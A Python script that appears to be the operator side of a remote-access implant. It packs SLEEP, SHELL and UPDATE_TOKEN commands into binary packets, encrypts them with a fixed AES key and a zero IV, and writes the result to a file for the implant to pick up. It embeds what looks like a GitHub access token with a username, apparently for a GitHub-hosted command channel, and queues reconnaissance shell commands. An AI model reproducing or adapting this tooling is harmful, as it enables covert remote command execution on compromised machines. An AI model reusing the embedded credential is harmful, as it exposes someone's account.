from Crypto.Cipher import AES
import base64
import sys
import json

from Crypto.Cipher import AES
import base64
import struct

COMMAND_SLEEP          = 0x15
COMMAND_SHELL          = 0x16
COMMAND_UPDATE_TOKEN   = 0x17
# 密钥（key）, 密斯偏移量（iv） CBC模式加密

BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def add_to_16(text):
    while len(text) % 16 != 0:
        text += b'\0'
    return (text)


vi = '0000000000000000'


def AES_Encrypt(key, data):
    # data = pad(data)
    data = add_to_16(data)
    # 字符串补位
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))
    encryptedbytes = cipher.encrypt(data)
    # 加密后得到的是bytes类型的数据，使用Base64进行编码,返回byte字符串
    encodestrs = base64.b64encode(encryptedbytes)
    # 对byte字符串按utf-8进行解码
    enctext = encodestrs.decode('utf8')
    return enctext

def shell(command):
    _b_command = bytes(command, encoding='utf-8')
    _header = struct.pack('!ii', COMMAND_SHELL, 4 + len(_b_command))
    _data0 = _header + struct.pack('!i', len(_b_command)) + _b_command
    return _data0

def token():
    _token = bytes('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', encoding='utf-8')
    _token_len = len(_token)
    _user = bytes('monkey01a', encoding='utf-8')
    _user_len = len(_user)
    _project = bytes('project', encoding='utf-8')
    _project_len = len(_project)
    _header = struct.pack('!ii', COMMAND_UPDATE_TOKEN, 12 + _token_len + _user_len + _project_len)
    
    _data = _header + struct.pack('!i', _token_len) + _token
    _data = _data + struct.pack('!i', _user_len) + _user
    _data = _data + struct.pack('!i', _project_len) + _project
    return _data

def msleep(t):
    _header = struct.pack('!ii', COMMAND_SLEEP, 4)
    _data0 = _header + struct.pack('!i', t)
    return _data0
    
if __name__ == '__main__':
    _token = token()
    shell1 = shell('ls -alsh')
    shell2 = shell('uname -a')
    _data = AES_Encrypt('9876.4321@yt()wq', _token + shell1 + shell2 + msleep(500))
    print(_data)
    with open('data.txt', 'w') as f:
        f.write(_data)
